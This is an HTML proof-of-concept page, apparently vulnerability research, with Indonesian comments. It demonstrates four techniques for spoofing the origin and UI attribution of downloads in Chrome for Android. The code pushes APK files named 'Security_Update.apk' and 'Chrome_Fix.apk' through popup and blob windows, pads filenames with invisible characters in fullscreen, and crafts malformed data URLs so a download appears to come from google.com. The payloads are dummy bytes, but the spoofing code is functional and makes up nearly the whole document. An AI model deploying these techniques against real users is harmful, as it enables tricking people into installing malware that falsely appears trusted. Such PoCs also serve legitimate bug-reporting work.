<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chromium Android Security Research POC</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: #fff; text-align: center; padding: 20px; }
        .card { background: #2d2d2d; border-radius: 12px; padding: 20px; margin: 10px auto; max-width: 500px; border: 1px solid #444; }
        h2 { color: #00e676; }
        button { 
            width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 6px; 
            font-weight: bold; cursor: pointer; transition: 0.2s;
        }
        .btn-fs { background: #ff5252; color: white; }
        .btn-blob { background: #448aff; color: white; }
        .btn-ui { background: #ffd740; color: #000; }
        .btn-auth { background: #e0e0e0; color: #000; }
        button:hover { opacity: 0.8; transform: scale(1.02); }
        #log { font-family: monospace; background: #000; color: #00e676; padding: 15px; border-radius: 6px; margin-top: 20px; text-align: left; font-size: 12px; }
    </style>
</head>
<body>

    <h2>Master PoC: Origin & UI Attribution</h2>
    <p>Gunakan untuk menguji celah pada Chrome Android Download Manager.</p>

    <div class="card">
        <!-- Metode 1: Hybrid FileSystem + Window -->
        <button class="btn-fs" onclick="runHybridFS()">1. Run Hybrid FileSystem + Window</button>

        <!-- Metode 2: Blob URL Context -->
        <button class="btn-blob" onclick="runBlobContext()">2. Run Blob URL Context</button>

        <!-- Metode 3: UI Space Injection -->
        <button class="btn-ui" onclick="runSpaceInjection()">3. Run UI Space Injection</button>

        <!-- Metode 4: Original Authority Injection -->
        <button class="btn-auth" onclick="runAuthInjection()">4. Run Authority Injection</button>
    </div>

    <div id="log">Status: Awaiting action...</div>

    <script>
        const logger = document.getElementById('log');
        const updateLog = (msg) => logger.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;

        function goFS() {
            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
            else if (document.documentElement.webkitRequestFullscreen) document.documentElement.webkitRequestFullscreen();
        }

        // --- 1. HYBRID FILESYSTEM + WINDOW ---
        function runHybridFS() {
            updateLog("Initializing FileSystem...");
            window.requestFileSystem = window.requestFileSystem || window.webkitRequestFileSystem;
            if (!window.requestFileSystem) return updateLog("Error: FileSystem API not supported.");

            window.requestFileSystem(window.TEMPORARY, 1024*1024, (fs) => {
                fs.root.getFile('update.apk', { create: true }, (fileEntry) => {
                    fileEntry.createWriter((fileWriter) => {
                        const blob = new Blob(['poc_data'], { type: 'application/vnd.android.package-archive' });
                        fileWriter.onwriteend = () => {
                            const fsURL = fileEntry.toURL();
                            const win = window.open("", "_blank", "width=200,height=200");
                            if (win) {
                                updateLog("Window opened. Triggering FS download in 2s...");
                                setTimeout(() => {
                                    const a = win.document.createElement("a");
                                    a.href = fsURL;
                                    a.download = "Security_Update.apk";
                                    win.document.body.appendChild(a);
                                    a.click();
                                    setTimeout(() => win.close(), 3000);
                                }, 2000);
                            }
                        };
                        fileWriter.write(blob);
                    });
                });
            });
        }

        // --- 2. BLOB URL CONTEXT ---
        function runBlobContext() {
            updateLog("Creating Blob Context...");
            const html = `
                <script>
                    const a = document.createElement("a");
                    a.href = "data:application/octet-stream;base64,ZXN0dGVzdHRlc3Q=";
                    a.download = "Chrome_Fix.apk";
                    a.click();
                    setTimeout(() => window.close(), 10000);
                <\/script>
            `;
            const blob = new Blob([html], {type: 'text/html'});
            const url = URL.createObjectURL(blob);
            window.open(url, "_blank");
            updateLog("Blob window triggered.");
        }

        // --- 3. UI SPACE INJECTION ---
        function runSpaceInjection() {
            updateLog("Running Space Injection...");
            goFS();
            // Menggunakan karakter Ogham Space (\u1680) untuk mengisi kekosongan UI
           /**
 * \u202E = Right-to-Left Override (Memulai urutan dari kanan)
 * \u202C = Pop Directional Formatting (Mengakhiri efek RTL)
 */


            const fakeName = "Google.com wants download this" + "\uFEFF".repeat(40) + "chrome.apk";            
            setTimeout(() => {
                const a = document.createElement("a");
                a.href = "data:/\\\\\\/.google.com/application/x-msdownload;base64,ZXN0dGVzdHRlc3Q=";
                a.download = fakeName;
                a.click();
            }, 1000);
        }

        // --- 4. AUTHORITY INJECTION ---
        function runAuthInjection() {
            updateLog("Running Authority Injection...");
            goFS();
            setTimeout(() => {
                const a = document.createElement("a");
                a.href = "data:/\\\\\\/.google.com/application/x-msdownload;base64,ZXN0dGVzdHRlc3Q=";
                a.download = "google.com want's to download chrome.apk";
                a.click();
            }, 1000);
        }
    </script>
</body>
</html>
